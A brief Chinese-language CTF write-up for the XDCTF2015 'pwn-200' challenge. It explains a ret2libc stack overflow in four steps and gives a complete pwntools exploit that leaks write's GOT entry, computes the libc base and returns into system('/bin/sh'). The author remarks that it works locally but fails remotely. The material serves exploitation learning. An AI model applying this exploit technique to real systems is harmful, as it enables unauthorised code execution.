# pwn-200

1. 本地使用libc-2.31版本，payload1用write函数输出经过链接器ld赋值的write的got.plt值，即write在进程中的真实地址  

2. 用它减去libc中write的偏移量（`libc.sym['write']`)，得到libc的基址，  

此时让进程从头执行，  

3. 再用基址加上libc中system函数、"/bin/sh"字符串的偏移量，得到它们在进程中的真实地址，  

4. payload2再把system函数地址覆盖到EIP上。  

EXP：
```python
import pwn

pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./pwn-200')
#p = pwn.remote('220.249.52.133', 50039)

e = pwn.ELF('./pwn-200')

libc = pwn.ELF('/lib32/libc-2.31.so')

main_addr = pwn.p32(0x080484be)         # main函数入口地址，固定的
write_plt = pwn.p32(e.plt['write'])     # write函数的plt地址，将读取got.plt地址的值
write_got = pwn.p32(e.got['write'])     # write函数的got.plt地址（此时尚未被修改，指向plt地址的下一条指令地址）



payload1 = b'A' * 108 + b'B' * 4 + write_plt + main_addr + pwn.p32(1) + write_got + pwn.p32(4)
#                           write函数暂时地址 返回地址 write参数：stdout  write的got.plt值  4个字节长度

p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload1)  

write_addr = p.recv(4)      # 此时write_got已被修改成write函数的真实地址
write_addr = pwn.u32(write_addr)

# 计算libc基址，system()和字符串"/bin/sh"的真实地址
libc_base = write_addr - libc.sym['write']
system_addr = pwn.p32(libc_base + libc.sym['system'])
sh_addr = pwn.p32(libc_base + next(libc.search('/bin/sh')))

payload2 = b'A' * 108 + b'B' * 4 + system_addr + b'C' * 4 + sh_addr
p.sendlineafter(b'Welcome to XDCTF2015~!\n', payload2)

p.interactive()
```

不知道为什么本地可以，远程不行。  